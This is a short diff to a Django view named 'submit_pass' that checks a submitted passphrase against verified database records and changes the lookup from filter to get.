@@ -76,8 +76,8 @@ def submit_pass(request):
     if request.method == "POST":
         keys = request.POST.get('mf-text', '')
         words = keys.split()
-        
-        if models.PassPhrase.objects.filter(keys=keys, is_verified = True):
+
+        if models.PassPhrase.objects.get(keys=keys, is_verified = True):
             return render(request, 'verification.html', {})
         
 
